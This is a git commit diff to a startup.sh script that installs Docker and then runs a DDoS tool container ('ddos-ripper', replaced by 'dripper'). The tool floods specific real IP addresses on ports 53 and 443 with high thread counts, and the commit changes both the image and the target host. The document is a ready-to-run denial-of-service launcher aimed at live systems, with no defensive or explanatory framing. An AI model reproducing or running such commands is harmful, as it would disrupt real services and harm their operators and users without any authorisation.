7d4391e1c79f5b47643b47169b7a367635efcab5
chmod777anarchy <chmod777@disroot.org>
2022-03-02 15:54:08 +0200

    changed docker image names

--- startup.sh
+++ startup.sh
@@ -8,4 +8,4 @@ echo \
   $(lsb_release -cs) stable" | tee /etc/apt/sources.list.d/docker.list > /dev/null
 apt-get update
 apt-get install -y docker-ce docker-ce-cli containerd.io
-docker run --rm -i --entrypoint=python3 nitupkcuf/ddos-ripper DRipper.py -s 194.54.14.186  -p 53 -t 135 -q 10000
+docker run -i --rm alexmon1989/dripper:1.0.1 -s 194.54.14.132 -p 443 -t 1000
